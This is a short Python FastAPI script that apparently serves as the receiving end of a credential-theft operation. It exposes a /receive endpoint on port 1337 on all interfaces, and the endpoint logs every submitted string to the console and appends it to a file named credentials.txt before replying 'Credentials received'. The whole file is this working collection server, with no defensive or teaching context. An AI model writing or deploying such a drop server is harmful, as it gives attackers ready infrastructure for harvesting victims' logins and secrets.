import uvicorn
from fastapi import FastAPI

app = FastAPI()

@app.post("/receive")
async def receive(data: str):
    print(data)
    with open("credentials.txt", "a") as f:
        f.write(data + "\n")
    return {"message": "Credentials received"}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=1337)
